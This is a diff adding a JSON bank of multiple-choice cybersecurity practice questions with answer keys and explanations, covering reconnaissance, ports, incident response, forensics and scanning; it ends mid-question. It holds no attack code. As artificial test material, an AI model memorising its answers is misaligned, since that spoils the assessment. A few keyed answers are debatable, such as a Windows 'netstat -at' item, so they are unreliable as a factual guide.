@@ -1,0 +1,1907 @@
+{
+ "questions": [
+  {
+   "q": "A security analyst needs to determine the operating systems running on multiple hosts across both wired and wireless networks. Which technique provides the most reliable OS identification?",
+   "options": [
+    "Collecting email headers from user mailboxes",
+    "Analyzing social media profiles of network users",
+    "Running NMAP with OS detection flags",
+    "Examining active TCP connections with netstat"
+   ],
+   "answer": 2,
+   "why": "NMAP’s OS detection uses fingerprinting to identify host operating systems, which is the standard method for environmental reconnaissance."
+  },
+  {
+   "q": "After reviewing Netflow records, an analyst notices a spike in traffic to an unfamiliar external IP. Which analytical method is most appropriate to evaluate this behavior?",
+   "options": [
+    "Availability analysis",
+    "Heuristic analysis",
+    "Anomaly analysis",
+    "Trend analysis"
+   ],
+   "answer": 2,
+   "why": "Anomaly analysis compares current traffic to a baseline to spot deviations such as unexpected spikes, making it ideal for Netflow investigations."
+  },
+  {
+   "q": "Following detection of lateral movement within a corporate network, the team decides to limit the attacker’s reach. Which control best implements network segmentation to contain the breach?",
+   "options": [
+    "Requiring complex passwords for all user accounts",
+    "Deploying VLANs to separate traffic domains",
+    "Enforcing host‑based firewalls on each endpoint",
+    "Applying the latest OS patches to all servers"
+   ],
+   "answer": 1,
+   "why": "VLANs create distinct broadcast domains, providing logical network segmentation that isolates compromised segments."
+  },
+  {
+   "q": "A security analyst needs to continuously monitor critical system files for unauthorized modifications. Which solution is most appropriate for automated integrity checking?",
+   "options": [
+    "Write a cron job that runs sha1sum on the files and compares the output",
+    "Deploy Tripwire to track and alert on file changes",
+    "Encrypt the files and store the encryption key offline",
+    "Create a script that periodically reads the MAC addresses of the files"
+   ],
+   "answer": 1,
+   "why": "Tripwire is a dedicated file integrity monitoring tool that automatically detects and reports changes to protected files."
+  },
+  {
+   "q": "During an OSINT engagement, an analyst must collect publicly available emails, subdomains, and employee names for a target organization. Which tool is specifically built for this purpose?",
+   "options": [
+    "osint-ng",
+    "Shodan",
+    "nmap",
+    "theHarvester"
+   ],
+   "answer": 3,
+   "why": "theHarvester is designed to harvest email addresses, subdomains, and other public data from search engines and other sources."
+  },
+  {
+   "q": "A forensic examiner has a suspicious executable and wants to view any readable text it may contain (e.g., URLs, error messages). Which Linux command should be used for this quick inspection?",
+   "options": [
+    "strings",
+    "less",
+    "cat",
+    "grep"
+   ],
+   "answer": 0,
+   "why": "The strings command extracts printable character sequences from binary files, revealing embedded information useful in analysis."
+  },
+  {
+   "q": "During a penetration test, Maya's scanner reports that TCP port 1433 on a target host is accepting connections. Which application is most commonly associated with this port?",
+   "options": [
+    "Oracle Database",
+    "Microsoft SQL Server",
+    "Virtual Network Computing (VNC)",
+    "Internet Relay Chat (IRC)"
+   ],
+   "answer": 1,
+   "why": "Port 1433 is the default listening port for Microsoft SQL Server."
+  },
+  {
+   "q": "Sam reviews an annual report that lists the frequency of various malware families over the past five years. He wants to identify which threats are becoming more common and which are declining. What kind of analysis is Sam performing?",
+   "options": [
+    "Heuristic analysis",
+    "Trend analysis",
+    "Availability analysis",
+    "Anomaly analysis"
+   ],
+   "answer": 1,
+   "why": "Examining changes in occurrence over time to spot rising or falling patterns is called trend analysis."
+  },
+  {
+   "q": "A security analyst configures the corporate firewall to intercept DNS queries for known malicious domains and returns the IP address of an internal web server that displays a warning page. What is this defensive technique called?",
+   "options": [
+    "DNS tunneling",
+    "DNS hijacking",
+    "DNS sinkholing",
+    "DNS spoofing"
+   ],
+   "answer": 2,
+   "why": "Redirecting malicious domain queries to a controlled server is known as DNS sinkholing."
+  },
+  {
+   "q": "During malware analysis, an analyst finds that the payload is stored as a long string of seemingly random characters. Decoding the string reveals executable code. Which encoding scheme is most commonly used for this purpose?",
+   "options": [
+    "Hexadecimal",
+    "Base64",
+    "ROT13",
+    "UUencode"
+   ],
+   "answer": 1,
+   "why": "Base64 is frequently used to encode data so that it is not easily readable in plain text."
+  },
+  {
+   "q": "To stop external actors from enumerating user accounts in the organization’s public LDAP directory, the administrator decides to require authentication before any LDAP query is answered. Which security control does this represent?",
+   "options": [
+    "Enforcing authentication on LDAP queries",
+    "Deploying a perimeter firewall",
+    "Installing an intrusion detection system",
+    "Applying rate‑limit thresholds to LDAP requests"
+   ],
+   "answer": 0,
+   "why": "Requiring authentication for LDAP access prevents unauthenticated enumeration, directly addressing the harvesting issue."
+  },
+  {
+   "q": "During a risk assessment of a newly deployed web application, which finding should be addressed first because it poses the greatest threat?",
+   "options": [
+    "A SQL injection flaw in a CGI component",
+    "Directory listing is enabled on the web root",
+    "The application version is disclosed in HTTP headers",
+    "The web server sends authentication data without encryption"
+   ],
+   "answer": 0,
+   "why": "SQL injection can allow attackers to execute arbitrary queries and compromise data, making it the most severe issue."
+  },
+  {
+   "q": "A legacy vulnerability scanner no longer reports a known CVE that other scanners identify. What is the most likely cause?",
+   "options": [
+    "Its signature database is outdated because the maintenance subscription has expired",
+    "The scanner is installed on an unsupported operating system version",
+    "The credentials supplied for the scan are incorrect",
+    "The scanner's network interface is disabled"
+   ],
+   "answer": 0,
+   "why": "Without a current subscription, the scanner's vulnerability signatures are not updated, so it misses known issues."
+  },
+  {
+   "q": "An internal scan flags a possible command injection, yet an external scan from the Internet does not show the same finding. Logs only contain requests from internal IPs. What most likely explains this difference?",
+   "options": [
+    "A perimeter firewall is blocking inbound connections to the vulnerable service",
+    "The vulnerable component resides on a subnet reachable only internally",
+    "A web application firewall sanitizes requests coming from outside the network",
+    "The external scanner uses a different set of test payloads"
+   ],
+   "answer": 0,
+   "why": "If the firewall blocks external traffic to the service, external scanners cannot reach the vulnerable endpoint, so the issue appears only in internal scans."
+  },
+  {
+   "q": "Before executing a scheduled network upgrade, what three activities should the change manager complete in addition to the technical implementation plan?",
+   "options": [
+    "Draft a communication template, assign a project manager, and order additional licenses",
+    "Develop a rollback script, schedule a post‑implementation review, and train the support staff",
+    "Notify all affected parties, record the change in the CMDB, and assess potential risks",
+    "Purchase new hardware, update the firewall rules, and create a backup of the configuration"
+   ],
+   "answer": 2,
+   "why": "Effective change management requires stakeholder notification, documentation of the change, and risk identification before implementation."
+  },
+  {
+   "q": "A security analyst must block network traffic to a legacy file‑sharing service. Which of the following ports does NOT need to be blocked because it is unrelated to that service?",
+   "options": [
+    "UDP 137 (NetBIOS Name Service)",
+    "TCP 445 (SMB over TCP)",
+    "TCP 389 (LDAP)",
+    "TCP 139 (NetBIOS Session Service)"
+   ],
+   "answer": 2,
+   "why": "Port 389 is used for LDAP, not for the file‑sharing service that relies on NetBIOS and SMB ports 137, 139, and 445."
+  },
+  {
+   "q": "After a large vulnerability scan, an analyst wants to reduce the number of low‑severity alerts and focus on the most critical findings. Which setting should be adjusted?",
+   "options": [
+    "Decrease the scan sensitivity",
+    "Increase the scan sensitivity",
+    "Increase the scan frequency",
+    "Decrease the scan frequency"
+   ],
+   "answer": 0,
+   "why": "Lowering the scanner's sensitivity reduces false positives, allowing the analyst to concentrate on higher‑severity vulnerabilities."
+  },
+  {
+   "q": "A security team needs to develop a reusable checklist that can be automatically evaluated and produce standardized results for different departments. Which SCAP component should they use to author this checklist?",
+   "options": [
+    "Extensible Configuration Checklist Description Format (XCCDF)",
+    "Common Platform Enumeration (CPE)",
+    "Open Vulnerability and Assessment Language (OVAL)",
+    "Common Configuration Enumeration (CCE)"
+   ],
+   "answer": 0,
+   "why": "XCCDF defines checklists and assessment procedures, enabling automated evaluation and standardized reporting across teams."
+  },
+  {
+   "q": "A federal agency security manager is reviewing the agency's vulnerability‑scanning policy for FISMA compliance. Which of the following actions is NOT required by FISMA for the scanning process?",
+   "options": [
+    "Distribute the scan findings to the general public",
+    "Perform comprehensive scans at least once each month",
+    "Employ tools that support interoperability and automation",
+    "Remediate all verified, legitimate vulnerabilities"
+   ],
+   "answer": 0,
+   "why": "FISMA requires internal sharing of scan data and remediation, but it does not mandate publishing scan results to the public."
+  },
+  {
+   "q": "An organization must assess configuration compliance on hundreds of workstations that cannot have agents installed. Which scanning method will most effectively uncover configuration issues on these unmanaged hosts?",
+   "options": [
+    "Rely on a central server to push configuration checks without credentials",
+    "Deploy an agent on each workstation and run local scans",
+    "Use credentialed remote scanning to log in and query settings",
+    "Monitor network traffic passively to infer configuration states"
+   ],
+   "answer": 2,
+   "why": "Credentialed remote scanning can log into each host and directly read configuration data without needing agents, making it ideal for unmanaged systems."
+  },
+  {
+   "q": "A forensic analyst must acquire evidence from a production server that cannot be powered down for business continuity reasons. Which acquisition method best preserves volatile data while minimizing impact on the live system?",
+   "options": [
+    "Shut down the server and create a forensic image using a hardware write blocker.",
+    "Attach a hardware write blocker to the physical drive and clone it without stopping the server.",
+    "Perform a continuous network packet capture for the duration of the investigation.",
+    "Copy the server's virtual disk files while it runs and capture RAM with a live memory acquisition tool."
+   ],
+   "answer": 3,
+   "why": "Copying virtual disk files while the VM is running and acquiring RAM with a live memory tool provides a complete image without requiring shutdown."
+  },
+  {
+   "q": "During evidence collection, every cable and connector on a seized workstation is marked with a distinct colored label. What is the primary reason for this practice?",
+   "options": [
+    "To encrypt the data traveling through each cable.",
+    "To make any tampering with the hardware immediately visible.",
+    "To document the chain of custody for each individual component.",
+    "To ensure the system can be reassembled exactly as it was found."
+   ],
+   "answer": 3,
+   "why": "Color‑coded labeling helps investigators re‑assemble the hardware in its original configuration, preserving the integrity of the evidence."
+  },
+  {
+   "q": "An incident response team needs a messaging solution that guarantees end‑to‑end confidentiality for sensitive communications. Which option best meets this requirement?",
+   "options": [
+    "Standard SMS text messaging using the carrier's network.",
+    "An XMPP (Jabber) server with TLS enabled for transport security.",
+    "Email messages secured with TLS during transmission.",
+    "A chat application that implements the Signal protocol for encryption."
+   ],
+   "answer": 3,
+   "why": "The Signal protocol provides strong end‑to‑end encryption, ensuring messages remain confidential even if the transport layer is compromised."
+  },
+  {
+   "q": "An incident response manager must define a retention schedule for incident data when no legal or contractual requirements apply. Which time frame best reflects common industry practice?",
+   "options": [
+    "5 years",
+    "1 to 2 years",
+    "90 days",
+    "30 days"
+   ],
+   "answer": 1,
+   "why": "Industry guidelines typically recommend keeping incident data for 1–2 years when no specific legal mandates exist."
+  },
+  {
+   "q": "A critical e‑commerce server has been compromised and must be restored to a clean state. Which incident‑response objective is most directly affected by this restoration action?",
+   "options": [
+    "Preserving forensic evidence",
+    "Reducing time and resources needed for the response",
+    "Limiting damage to the system",
+    "Maintaining service availability"
+   ],
+   "answer": 3,
+   "why": "Rebuilding the server primarily impacts service availability, as downtime is incurred while the system is restored."
+  },
+  {
+   "q": "You need to create a forensic disk image that can be opened by virtually any forensic analysis tool. Which image format should you choose?",
+   "options": [
+    "AFF (Advanced Forensic Format)",
+    "E01 (EnCase)",
+    "DMG (Apple Disk Image)",
+    "RAW (bit‑for‑bit copy)"
+   ],
+   "answer": 3,
+   "why": "RAW images are simple bit‑for‑bit copies and are supported by almost all forensic tools."
+  },
+  {
+   "q": "Payroll processing has stopped for the current pay period, preventing employees from being paid on time. Using the NIST functional impact categories, how should this incident be classified?",
+   "options": [
+    "Medium",
+    "Critical",
+    "Low",
+    "High"
+   ],
+   "answer": 1,
+   "why": "The inability to pay staff directly impacts core business operations, matching the NIST definition of a Critical impact."
+  },
+  {
+   "q": "Laura must prove that a seized laptop was not altered while it was stored in a secure evidence room. Which control provides the most reliable proof of untampered custody?",
+   "options": [
+    "A signed chain‑of‑custody log",
+    "System event logs",
+    "Photographic documentation of the laptop",
+    "Tamper‑evident seals on the device"
+   ],
+   "answer": 3,
+   "why": "Tamper‑evident seals give physical evidence that the device was not opened or altered while unattended."
+  },
+  {
+   "q": "An incident response team is gathering Windows event logs and network traffic captures to pinpoint the attacker’s method of entry. Which NIST incident‑response phase best describes this activity?",
+   "options": [
+    "Containment, Eradication, and Recovery",
+    "Preparation",
+    "Post‑Incident Activity",
+    "Detection and Analysis"
+   ],
+   "answer": 3,
+   "why": "Collecting and analyzing logs to identify the source of an intrusion is the core task of the Detection and Analysis phase."
+  },
+  {
+   "q": "Which authentication protocol, when enabled alongside Active Directory, introduces the greatest security risk because it relies on weak challenge‑response mechanisms?",
+   "options": [
+    "NTLMv1",
+    "NTLMv2",
+    "LDAPS",
+    "Kerberos"
+   ],
+   "answer": 0,
+   "why": "NTLMv1 uses outdated hashing and is vulnerable to relay and brute‑force attacks, making it the riskiest protocol with AD."
+  },
+  {
+   "q": "A development team runs a fuzzing tool against their new API. Which category of vulnerability is this testing most likely to uncover?",
+   "options": [
+    "Incorrect firewall rule configuration",
+    "Use of weak encryption algorithms",
+    "SQL injection caused by unvalidated input",
+    "Missing operating system patches"
+   ],
+   "answer": 2,
+   "why": "Fuzz testing feeds random data to discover how the application handles unexpected input, often revealing input‑validation flaws such as SQL injection."
+  },
+  {
+   "q": "An employee who moved from a database administrator role to a software developer still retains full admin rights on the production database. This scenario best illustrates which security principle?",
+   "options": [
+    "Least privilege",
+    "Privilege creep",
+    "Separation of duties",
+    "Role‑based access control"
+   ],
+   "answer": 1,
+   "why": "Privilege creep occurs when users keep permissions that exceed the needs of their current job function."
+  },
+  {
+   "q": "A security analyst needs a free forensic framework that bundles tools for disk imaging, file system analysis, and memory forensics. Which open‑source suite best fits this requirement?",
+   "options": [
+    "FTK",
+    "X-Ways",
+    "SIFT",
+    "EnCase"
+   ],
+   "answer": 2,
+   "why": "SIFT (SANS Investigative Forensic Toolkit) is an open‑source collection that includes Autopsy, Sleuth Kit, Volatility, and other forensic utilities."
+  },
+  {
+   "q": "In an LDAP directory, entries such as \"ou=Finance\" or \"ou=Engineering\" are used to group related objects. What does the abbreviation \"ou\" stand for?",
+   "options": [
+    "organizational unit",
+    "user identifier",
+    "domain component",
+    "common name"
+   ],
+   "answer": 0,
+   "why": "The \"ou\" attribute denotes an Organizational Unit, which is used to organize entries like departments within an LDAP hierarchy."
+  },
+  {
+   "q": "Bob wants to send a confidential email to Alice using their RSA key pairs. Which key should Bob employ to encrypt the message so only Alice can read it?",
+   "options": [
+    "Bob’s private key",
+    "Alice’s private key",
+    "Alice’s public key",
+    "Bob’s public key"
+   ],
+   "answer": 2,
+   "why": "Encrypting with Alice’s public key ensures that only Alice’s corresponding private key can decrypt the message, providing confidentiality."
+  },
+  {
+   "q": "Wanda wants to make the account provisioning and de‑provisioning workflow faster and with fewer steps. Which improvement framework emphasizes waste reduction and process variation control to achieve that goal?",
+   "options": [
+    "Agile",
+    "Waterfall",
+    "DevOps",
+    "Lean Six Sigma"
+   ],
+   "answer": 3,
+   "why": "Lean Six Sigma targets waste elimination and variation reduction, making processes like account lifecycle management more efficient."
+  },
+  {
+   "q": "Veronica needs a commercial network vulnerability scanner that is broadly adopted in the industry and offers cloud‑based scanning with extensive reporting. Which product best fits this requirement?",
+   "options": [
+    "Qualys",
+    "OpenVAS",
+    "Nessus",
+    "Burp Suite"
+   ],
+   "answer": 0,
+   "why": "Qualys is a widely used commercial scanner known for its cloud platform, large vulnerability database, and robust reporting features."
+  },
+  {
+   "q": "Jacob must collect logs from Windows servers, Linux hosts, and Cisco routers and send them to a single log server. Which logging protocol is supported across all these platforms?",
+   "options": [
+    "WMI",
+    "Syslog",
+    "NetFlow",
+    "SNMP"
+   ],
+   "answer": 1,
+   "why": "Syslog is a standard protocol available on Windows, Linux, and network devices, enabling centralized log collection."
+  },
+  {
+   "q": "During a Windows forensic examination, an analyst wants to find out which programs are configured to start automatically when the system boots. Which data store should the analyst examine first?",
+   "options": [
+    "The system registry",
+    "Prefetch files in the Windows directory",
+    "NTFS index (INDX) files",
+    "The system event log files"
+   ],
+   "answer": 0,
+   "why": "Autorun entries are recorded in specific registry keys; examining the registry reveals programs set to run at startup."
+  },
+  {
+   "q": "A security review notes that a high‑sensitivity system requires users to enter a password plus a four‑digit PIN to log on. Which observation about this authentication scheme is most accurate?",
+   "options": [
+    "A four‑digit PIN adds sufficient complexity to meet MFA requirements.",
+    "Both credentials are knowledge‑based, so the scheme does not provide true multi‑factor authentication.",
+    "The password and PIN are independent factors, making the control fully effective.",
+    "A true multi‑factor system must use at least three different factors."
+   ],
+   "answer": 1,
+   "why": "Password and PIN are both something‑you‑know factors; using two of the same type does not constitute multi‑factor authentication."
+  },
+  {
+   "q": "In incident response planning, which term describes the ranking of data sources based on how quickly they become unavailable or change after a compromise?",
+   "options": [
+    "Data integrity level",
+    "Order of volatility",
+    "Data provenance hierarchy",
+    "Classification sensitivity"
+   ],
+   "answer": 1,
+   "why": "Order of volatility orders data by how rapidly it can be lost or altered, guiding investigators on what to collect first."
+  },
+  {
+   "q": "A court has issued a subpoena demanding the email archives stored on the corporate file server. Which internal procedure should the security analyst reference first to determine the proper steps for compliance?",
+   "options": [
+    "Data classification and handling policy",
+    "Evidence collection and production procedure",
+    "System monitoring and alerting procedure",
+    "Patch management and update procedure"
+   ],
+   "answer": 1,
+   "why": "A subpoena requires following the evidence production procedure, which defines how to preserve, collect, and deliver electronic records for legal requests."
+  },
+  {
+   "q": "An analyst runs \"netstat -at\" on a Windows host and sees the following listening ports: 22, 25, 80, 443, and 445. Which set of services is most likely running on the system?",
+   "options": [
+    "SSH, SMTP, HTTP, HTTPS, and Microsoft-DS (SMB)",
+    "FTP, DNS, HTTP, HTTPS, and SMB",
+    "SSH, POP3, HTTPS, and Microsoft RPC",
+    "Telnet, SMTP, HTTP, and SMB"
+   ],
+   "answer": 0,
+   "why": "Ports 22, 25, 80, 443, and 445 correspond to SSH, email (SMTP), plain‑text web (HTTP), secure web (HTTPS), and Microsoft‑DS (SMB) services."
+  },
+  {
+   "q": "During the preparation phase of the incident response lifecycle, which activity is typically performed?",
+   "options": [
+    "Isolating infected hosts and removing malware",
+    "Creating or updating IDS/IPS signatures to detect future attacks",
+    "Reviewing the response effort and updating documentation",
+    "Analyzing logs to identify the attack vector"
+   ],
+   "answer": 1,
+   "why": "Adding or updating IDS/IPS signatures is a proactive task done in the preparation phase to improve detection of new threats."
+  },
+  {
+   "q": "During a network audit, you notice that a server is listening on TCP port 1521. Which database product is most likely using this default port?",
+   "options": [
+    "Oracle",
+    "PostgreSQL",
+    "Microsoft SQL Server",
+    "MySQL"
+   ],
+   "answer": 0,
+   "why": "Oracle Database uses port 1521 as its default listening port, so traffic on that port usually indicates an Oracle service."
+  },
+  {
+   "q": "An endpoint protection solution runs a suspicious executable in a sandbox and monitors its actions to decide if it is malicious. Which detection technique is being used?",
+   "options": [
+    "Whitelist enforcement",
+    "Reputation‑based blocking",
+    "Heuristic detection",
+    "Signature‑based detection"
+   ],
+   "answer": 2,
+   "why": "Heuristic detection executes the program and observes behavior, allowing identification of malware even without a known signature."
+  },
+  {
+   "q": "When storing user passwords, which of the following methods provides the strongest protection against offline cracking attacks?",
+   "options": [
+    "SHA‑1 hash with a unique salt",
+    "Encrypting the password column with a symmetric key",
+    "MD5 hash with a unique salt",
+    "bcrypt hash with a built‑in salt"
+   ],
+   "answer": 3,
+   "why": "bcrypt incorporates a salt and a configurable work factor, making it far more resistant to brute‑force attacks than MD5, SHA‑1, or simple encryption."
+  },
+  {
+   "q": "An attacker is sending mass emails to guess valid corporate addresses and is using the bounce messages to confirm which accounts exist. Which of the following actions would most directly reduce this type of enumeration?",
+   "options": [
+    "Enforce SPF records for incoming messages",
+    "Disable nondeliverable (bounce) responses",
+    "Limit the size of email attachments",
+    "Enable SMTP authentication for all outbound mail"
+   ],
+   "answer": 1,
+   "why": "Turning off nondeliverable responses prevents the attacker from receiving bounce messages that reveal valid addresses."
+  },
+  {
+   "q": "Which capability is generally NOT offered by a Security Information and Event Management (SIEM) platform?",
+   "options": [
+    "Aggregating and correlating log data",
+    "Providing compliance reporting",
+    "Performance monitoring of network devices",
+    "Generating security alerts"
+   ],
+   "answer": 2,
+   "why": "SIEMs focus on security event handling and reporting; they do not typically include performance‑management functions."
+  },
+  {
+   "q": "An analyst relies on file hash signatures to detect malware. Which statement best describes the limitation of this approach?",
+   "options": [
+    "Hashes can uncover previously unknown (zero‑day) malware",
+    "Hashes only identify malware versions that have been previously catalogued",
+    "Hashes can detect new polymorphic variants of malware",
+    "Hashes provide insight into malicious behavior at runtime"
+   ],
+   "answer": 1,
+   "why": "Hash‑based detection matches only known signatures, so polymorphic or new variants with different hashes will not be detected."
+  },
+  {
+   "q": "An analyst needs to discover which process is currently holding /var/log/app.log open. Which command will provide this information most directly?",
+   "options": [
+    "ps aux",
+    "cat /var/log/app.log",
+    "lsof /var/log/app.log",
+    "netstat -an"
+   ],
+   "answer": 2,
+   "why": "lsof lists open files and shows the process that opened each file, making it ideal for identifying the holder of a specific log."
+  },
+  {
+   "q": "In a network access control (NAC) system, which type of criteria primarily evaluates the health and configuration of the endpoint rather than the user’s identity or job function?",
+   "options": [
+    "Time‑based criteria",
+    "Rule‑based criteria",
+    "Location‑based criteria",
+    "Role‑based criteria"
+   ],
+   "answer": 1,
+   "why": "Rule‑based NAC criteria focus on system health, patch level, and configuration, not on user attributes such as role or schedule."
+  },
+  {
+   "q": "A company stores unsalted MD5 password hashes for its users. Which attack method can most rapidly recover a large portion of these passwords?",
+   "options": [
+    "Phishing attack",
+    "Rainbow‑table attack",
+    "Man‑in‑the‑middle attack",
+    "GPU‑accelerated brute‑force attack"
+   ],
+   "answer": 1,
+   "why": "Rainbow tables contain pre‑computed MD5 hashes, allowing quick reversal of unsalted MD5 passwords."
+  },
+  {
+   "q": "A merchant is preparing for a PCI DSS compliance audit. Which of the following statements about the required vulnerability scan results is true?",
+   "options": [
+    "The scan must show no critical or high severity findings.",
+    "Low severity findings may be ignored as long as critical issues are fixed.",
+    "Only internal scans are required; external scans are optional.",
+    "Critical findings can remain if a remediation plan is submitted within 30 days."
+   ],
+   "answer": 0,
+   "why": "PCI DSS mandates a clean scan result with no critical or high vulnerabilities for compliance."
+  },
+  {
+   "q": "During a security review, an analyst notes that a VPN tunnel is using the Data Encryption Standard (DES) for encryption. What is the appropriate corrective action?",
+   "options": [
+    "Replace DES with an AES‑based cipher suite.",
+    "Disable encryption on the tunnel and rely on network segmentation.",
+    "Switch to Triple‑DES to improve security while keeping the same algorithm family.",
+    "Continue using DES because it provides faster performance."
+   ],
+   "answer": 0,
+   "why": "DES is considered insecure; it should be replaced with a modern AES cipher."
+  },
+  {
+   "q": "A critical Windows patch is available that could potentially disrupt core services. What is the best practice for deploying this patch in a large enterprise?",
+   "options": [
+    "First test the patch in a lab environment, then roll it out to production in stages.",
+    "Wait for the vendor to release a second version before taking any action.",
+    "Apply the patch only to a single test server and leave the rest unpatched.",
+    "Deploy the patch immediately to all production servers."
+   ],
+   "answer": 0,
+   "why": "Testing the patch before production and using a staged rollout minimizes the risk of widespread service disruption."
+  },
+  {
+   "q": "A security analyst is reviewing vulnerability scan data for a large enterprise. Which metric provides the most actionable insight for prioritizing remediation efforts?",
+   "options": [
+    "Count of assets that have at least one critical vulnerability.",
+    "Total number of vulnerabilities discovered across all assets.",
+    "Percentage of low‑severity findings resolved within 30 days.",
+    "Average time to remediate all findings regardless of severity."
+   ],
+   "answer": 0,
+   "why": "Focusing on assets with critical vulnerabilities highlights the most risky systems; this metric directly supports prioritizing remediation."
+  },
+  {
+   "q": "A scan reports a low‑severity issue on a hypervisor’s web management console that is reachable from the internet and uses clear‑text credentials. What is the most appropriate immediate mitigation?",
+   "options": [
+    "Ignore the finding because the scanner labeled it low severity.",
+    "Apply the vendor patch and schedule a full system reboot.",
+    "Decommission the hypervisor to eliminate the risk.",
+    "Restrict inbound traffic to the console with firewall rules."
+   ],
+   "answer": 3,
+   "why": "Even a low‑severity finding can be critical when exposed externally; blocking access via the firewall mitigates the risk without disrupting services."
+  },
+  {
+   "q": "An auditor needs documentation that details the specific remediation steps for a single server that failed a vulnerability scan. Which report should the security team provide?",
+   "options": [
+    "Executive summary report.",
+    "Qualys Top 20 report.",
+    "Technical report for the host.",
+    "PCI compliance technical report."
+   ],
+   "answer": 2,
+   "why": "A technical report contains detailed, host‑specific information intended for engineers to remediate the identified issues."
+  },
+  {
+   "q": "An analyst wants an active reconnaissance technique, one that queries the target's own systems. Which fits?",
+   "options": [
+    "A reverse DNS lookup against the target's name servers",
+    "Searching Google for the organisation",
+    "Querying a public PGP key server",
+    "Searching Shodan's existing data"
+   ],
+   "answer": 0,
+   "why": "Active techniques touch the target's systems and can be logged by them. Search engines, Shodan and key servers hold third-party data, so using them is passive."
+  },
+  {
+   "q": "An analyst needs a free tool that reports exactly which Microsoft patches are installed or missing on a Windows server. Which gives the most detail?",
+   "options": [
+    "MBSA",
+    "Nessus",
+    "nmap",
+    "Metasploit"
+   ],
+   "answer": 0,
+   "why": "The Microsoft Baseline Security Analyzer checks for missing Microsoft updates and weak settings. nmap sees ports and services, not patch levels."
+  },
+  {
+   "q": "Which item is not usually part of the rules of engagement agreed for a reconnaissance exercise?",
+   "options": [
+    "What is in scope",
+    "Written authorisation",
+    "When testing may happen",
+    "The exact exploitation methods to be used"
+   ],
+   "answer": 3,
+   "why": "Rules of engagement cover timing, scope and permission. Specific techniques are chosen by the tester within those limits."
+  },
+  {
+   "q": "A scan shows TCP 3306 open on a database server. Which database is it most likely running?",
+   "options": [
+    "PostgreSQL",
+    "MySQL",
+    "Microsoft SQL Server",
+    "Oracle"
+   ],
+   "answer": 1,
+   "why": "MySQL and MariaDB listen on 3306 by default. PostgreSQL uses 5432, SQL Server 1433 and Oracle 1521."
+  },
+  {
+   "q": "To catch zero-day malware, which detection method should an anti-malware product use?",
+   "options": [
+    "Signature-based",
+    "Availability-based",
+    "Heuristic or behaviour-based",
+    "Trend-based"
+   ],
+   "answer": 2,
+   "why": "There is no signature for a zero-day yet, so detection has to rely on suspicious behaviour or code traits."
+  },
+  {
+   "q": "A web app stores passwords in plain text. What best protects them if the database is stolen?",
+   "options": [
+    "Hashing them with bcrypt",
+    "Encrypting the table of plain-text passwords",
+    "Hashing with SHA-1 and a salt",
+    "Hashing with MD5 and a salt"
+   ],
+   "answer": 0,
+   "why": "bcrypt is deliberately slow and salted, which makes cracking expensive. MD5 and SHA-1 are fast even with salt, and encryption fails if the key is stolen too."
+  },
+  {
+   "q": "How do you stop SSH login attempts against root while ordinary users can still use SSH?",
+   "options": [
+    "Add a network IPS rule for root",
+    "Set PermitRootLogin no in sshd_config",
+    "Add root to sudoers",
+    "Block root with an iptables rule"
+   ],
+   "answer": 1,
+   "why": "Only sshd knows which account is logging in. Firewalls and IPS rules see addresses and ports, not usernames inside the encrypted session."
+  },
+  {
+   "q": "What is the attacking team usually called in an exercise?",
+   "options": [
+    "Red team",
+    "Blue team",
+    "White team",
+    "Green team"
+   ],
+   "answer": 0,
+   "why": "The red team attacks, the blue team defends, and the white team referees and sets the rules."
+  },
+  {
+   "q": "A US agency must buy devices with a verified chain of custody for every chip. What is the programme called?",
+   "options": [
+    "Gray market procurement",
+    "White market procurement",
+    "Chain of Procurement",
+    "Trusted Foundry"
+   ],
+   "answer": 3,
+   "why": "The DoD's Trusted Foundry programme accredits suppliers so components in sensitive systems are free of tampering and counterfeits."
+  },
+  {
+   "q": "From a PC inside a secure network, which built-in command reveals the servers it already talks to without sending new traffic?",
+   "options": [
+    "traceroute",
+    "ping",
+    "nmap",
+    "netstat"
+   ],
+   "answer": 3,
+   "why": "netstat lists existing connections and listening ports. The other tools generate packets that could be noticed."
+  },
+  {
+   "q": "Gathering information from employees' social media is part of which NIST penetration testing phase?",
+   "options": [
+    "Planning",
+    "Reporting",
+    "Discovery",
+    "Attack"
+   ],
+   "answer": 2,
+   "why": "NIST SP 800-115 uses planning, discovery, attack and reporting. Open-source information gathering belongs to discovery."
+  },
+  {
+   "q": "Run with root privileges and no scan type given, which scan does nmap perform?",
+   "options": [
+    "TCP FIN scan",
+    "TCP connect scan",
+    "TCP SYN scan",
+    "UDP scan"
+   ],
+   "answer": 2,
+   "why": "With privileges nmap defaults to a half-open SYN scan (-sS). Without them it falls back to a full TCP connect scan (-sT)."
+  },
+  {
+   "q": "Which step usually shrinks an organisation's passive-reconnaissance footprint the most?",
+   "options": [
+    "Limit what the public website shows without logging in",
+    "Strip metadata from posted documents",
+    "Use private domain registration",
+    "Remove technology names from job ads"
+   ],
+   "answer": 0,
+   "why": "The public website is the richest single source for an outsider. The other steps help but cover smaller gaps."
+  },
+  {
+   "q": "On a Windows workstation, what does nbtstat -c show?",
+   "options": [
+    "MAC and IP addresses of local systems",
+    "Every NetBIOS host on the network",
+    "MAC-to-IP mappings",
+    "The NetBIOS name cache: names resolved to IP addresses"
+   ],
+   "answer": 3,
+   "why": "nbtstat -c shows recently resolved NetBIOS names and their IPs, which hints at other systems nearby."
+  },
+  {
+   "q": "Which service lets you view old snapshots of a website from many dates?",
+   "options": [
+    "The site's own cache",
+    "The Wayback Machine",
+    "Morlock",
+    "Time Machine"
+   ],
+   "answer": 1,
+   "why": "The Internet Archive's Wayback Machine stores historical copies, which may still contain information since removed."
+  },
+  {
+   "q": "An nmap report was produced with -O. What extra information should it include?",
+   "options": [
+    "Operating system and CPE details",
+    "Verbose port statistics",
+    "A list of closed ports only",
+    "ICMP status codes"
+   ],
+   "answer": 0,
+   "why": "-O enables OS fingerprinting and reports the platform using Common Platform Enumeration names."
+  },
+  {
+   "q": "Which technique is not passive footprinting?",
+   "options": [
+    "WHOIS lookups",
+    "Banner grabbing",
+    "BGP looking-glass queries",
+    "Domain registrar checks"
+   ],
+   "answer": 1,
+   "why": "Banner grabbing connects to the target's services to read their responses. The others use public registries."
+  },
+  {
+   "q": "An MX lookup returns two hosts for a domain. What can you conclude?",
+   "options": [
+    "The mail servers are clustered",
+    "The mail servers failed an SMTP test",
+    "The domain lists two mail servers in DNS",
+    "The mail servers are blocklisted"
+   ],
+   "answer": 2,
+   "why": "An MX query only shows which hosts accept mail for the domain and their priorities."
+  },
+  {
+   "q": "After compromising a web server in a DMZ, what should a red-team member do first to pivot to protected systems behind it?",
